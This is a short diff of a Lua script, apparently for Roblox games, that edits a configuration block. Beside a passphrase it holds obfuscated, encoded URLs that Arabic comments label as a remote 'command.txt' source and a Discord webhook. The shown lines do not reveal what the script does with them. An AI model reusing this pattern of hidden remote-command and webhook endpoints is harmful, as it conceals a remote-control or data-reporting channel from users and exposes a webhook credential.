@@ -29,7 +29,7 @@ local whitelistGames = {
 }
 
 -- ================ [ IMPORTANT: FILL THESE ] ================
-local AUTO_PASSPHRASE = "6 basse64"
+local AUTO_PASSPHRASE = "6- basse64"
 local ENCRYPTED_COMMAND_URL = "bnp6dnk6Ly94Z2MubW96bntuaHV0emtudHouaXVzL3Nrdmp5dD00LWprfC9Vc2FtZkpnemcveGx5L25rZ2p5L3Nnb3QvaXVzc2d0ai56fno"   -- ضع السلسلة المشفرة لـ command.txt
 local ENCRYPTED_WEBHOOK_URL = "bnp6dnk6Ly9qYm95dXhqLml1cy9ndm8vY2tuaHV1a3kvNzo1NDk5OjU3Nzo4Njo5NjM6ODo6L0k4c2xFaFBpN1g8V0JsZntvYk45T3otQnNifDdzWDg0VHpNVT9OWj9ufl84NC1ZcVFTcV81ckhfbmJzaFJ+QjdffjV0UA=="   -- ضع السلسلة المشفرة لـ Discord webhook (أو اتركه فارغاً)
 -- ==========================================================
